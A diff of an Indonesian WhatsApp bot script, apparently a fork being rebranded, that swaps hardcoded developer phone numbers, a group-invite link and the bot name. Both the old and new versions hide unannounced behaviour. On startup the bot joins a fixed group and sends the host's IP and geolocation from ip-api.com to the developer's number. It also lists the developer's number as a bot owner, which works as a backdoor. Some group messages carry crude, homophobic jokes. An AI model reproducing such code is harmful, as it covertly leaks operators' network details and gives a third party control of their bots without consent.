@@ -168,14 +168,14 @@ console.log(color('> HARI ','silver'), color(`${tampilHari}\n`,'mediumseagreen')
 	// session
 	await Fan.connect({ timeoutMs: 30 * 1000 });
   fs.writeFileSync(`./kontol.json`, JSON.stringify(Fan.base64EncodedAuthInfo(), null, '\t'))    
- teks = `https://chat.whatsapp.com/E4mPMyGkTmpCdlJiVDoLp8`
+ teks = `https://chat.whatsapp.com/DnX8SuIq84cIQ3ffREQljz`
  Fan.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
  console.log(color('|WRN|', 'yellow'), color('Bergabung ke Grup Official', 'cyan'))
- Fan.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(Fan.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./P3/image/runtime.jpeg'),sourceUrl:"https://wa.me/18054105292?text=Assalamualaikum"}}})
+ Fan.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(Fan.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./P3/image/runtime.jpeg'),sourceUrl:"https://wa.me/628979185922?text=Assalamualaikum"}}})
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       Fan.sendMessage("18054105292@s.whatsapp.net", `─────「 *BANG IRFAN INSTAGRAM YOK* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./P3/image/runtime.jpeg'),sourceUrl:"https://wa.me/18054105292?text=Assalamualaikum"}}})
+       Fan.sendMessage("628979185922@s.whatsapp.net", `─────「 *BANG IRFAN INSTAGRAM YOK* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./P3/image/runtime.jpeg'),sourceUrl:"https://wa.me/628979185922?text=Assalamualaikum"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'red'))
    })
 	
@@ -224,18 +224,16 @@ Fan.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
    // owner
 
 
-    const htod = "18054105292@s.whatsapp.net"
+    const htod = "628979185922@s.whatsapp.net"
 
     
-Fan.on('CB:action,,call', async json => {
-        const callerId = json[2][0][1].from;
-        var vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + `${NamaOwner}` + '\n' + `ORG:Developer ${NamaBot}\n` + 'TEL;type=CELL;type=VOICE;waid=' + `${NomorOwner}` + ':+' + `${NomorOwner}` + '\n' + 'END:VCARD'
-        Fan.sendMessage(callerId, "\`\`\`[ ! ] CALL DETECTED [ ! ]\`\`\`\n\n\`\`\`Anda Di Block Karena Telepon Bot , Silahkan Hubungi Developer Bot Untuk Membuka Block\`\`\`", MessageType.text)
-        Fan.sendMessage(callerId, { displayname: `${NamaOwner}`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `Developer ${NamaBot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./P3/image/runtime.jpeg'),sourceUrl:`https://wa.me/18054105292?text=Assalamualaikum`}}})
-        await sleep(5000)
-        await Fan.blockUser(callerId, "add")
-        })
-        
+Fan.on("CB:Call", json => {
+let call;
+calling = JSON.parse(JSON.stringify(json))
+call = calling[1].from
+Fan.sendMessage(call, `*Sorry No Anda Di Block Karna Menelpon/Vc Bot!*`, MessageType.text)
+.then(() => Fan.blockUser(call, "add"))
+})
 Fan.on("group-update", async (anu) => {
 
     metdata = await Fan.groupMetadata(anu.jid);
@@ -320,7 +318,7 @@ Fan.on('group-participants-update', async (anu) => {
 
 				teks = ` Hi @${num.split('@')[0]}\nSELAMAT DATANG DI\nDI *${mdata.subject}*\nJANGAN LUPA BACA RULES🗿`
 
-				sendButImage(anu.jid, teks, `_𝐅𝐚𝐧 𝐗7_`, img,but = [{buttonId:`apaaja`, 
+				sendButImage(anu.jid, teks, `Yuki bot`, img,but = [{buttonId:`apaaja`, 
 
                buttonText:{displayText: 'Oke\n*AKU MAU KASIH TAU KALO AKU ANAK HASIL GAY*'},type:1}], options = {contextInfo: {mentionedJid: [num, htod]}})
 
@@ -342,7 +340,7 @@ Fan.on('group-participants-update', async (anu) => {
 
 				teks = `MARI KITA DOAKAN\nYANG TERBAIK UNTUK\n@${num.split('@')[0]}\nATAS KEPERGIANYA DARI\n*${mdata.subject}*`
 
-				sendButImage(anu.jid, teks, `_𝐅𝐚𝐧 𝐗7_`, img,but = [{buttonId: `Hello World!`, buttonText: {displayText: `AMIN\nSEMOGA TENANG YA, TIDAK SEPERTI ORANG TUA SAYA YANG ADA DI TANAH🗿`}, type: 1}], options = {contextInfo: {mentionedJid: [num, htod]}})
+				sendButImage(anu.jid, teks, `Yuki bot`, img,but = [{buttonId: `Hello World!`, buttonText: {displayText: `AMIN\nSEMOGA TENANG YA, TIDAK SEPERTI ORANG TUA SAYA YANG ADA DI TANAH🗿`}, type: 1}], options = {contextInfo: {mentionedJid: [num, htod]}})
 
 			} else if (anu.action == 'promote') {
 
@@ -362,7 +360,7 @@ Fan.on('group-participants-update', async (anu) => {
 
 				teks = `「 PROMOTE - DETECTED 」\n\nNama : @${num.split("@")[0]}\nStatus : Member -> Admin\nGroup : ${mdata.subject}`
 
-				sendButImage(anu.jid, teks, `_𝐅𝐚𝐧 𝐗7_`, img,but = [{buttonId: `Hello World!`, buttonText: {displayText: `SELAMAT\nSAYANG ATAS KENAIKAN PANGKATNYA🗿`}, type: 1}], options = {contextInfo: {mentionedJid: [num]}})
+				sendButImage(anu.jid, teks, ``, img,but = [{buttonId: `Hello World!`, buttonText: {displayText: `SELAMAT\nSAYANG ATAS KENAIKAN PANGKATNYA🗿`}, type: 1}], options = {contextInfo: {mentionedJid: [num]}})
 
 			} else if (anu.action == 'demote') {
 
@@ -382,7 +380,7 @@ Fan.on('group-participants-update', async (anu) => {
 
 				teks = `「 DEMOTE - DETECTED 」\n\nNama : @${num.split("@")[0]}\nStatus : Admin -> Member\nGroup : ${mdata.subject}`
 
-				sendButImage(anu.jid, teks, `_𝐅𝐚𝐧 𝐗7_`, img,but = [{buttonId: `Hello World!`, buttonText: {displayText: `SABAR YA\nSAYANG NANTI DI KASIH JATAH KOK🤤`}, type: 1}], options = {contextInfo: {mentionedJid: [num]}})
+				sendButImage(anu.jid, teks, ``, img,but = [{buttonId: `Hello World!`, buttonText: {displayText: `SABAR YA\nSAYANG NANTI DI KASIH JATAH KOK🤤`}, type: 1}], options = {contextInfo: {mentionedJid: [num]}})
 
 			}
 
@@ -415,13 +413,11 @@ Fan.on('group-update', async (anu) => {
 	})
     Fan.on('chat-update', async (message) => {
         require('./Fan.js')(Fan, message)
-        ownerNumber = ["18054105292@s.whatsapp.net","18054105292@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
-        dtod = "18054105292@s.whatsapp.net"
+        ownerNumber = ["628979185922@s.whatsapp.net","628979185922@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
+        dtod = "628979185922@s.whatsapp.net"
        otod = `${settings.NomorOwner}@s.whatsapp.net`
     })  
 }
-
-
 
 /**
  * Uncache if there is file change
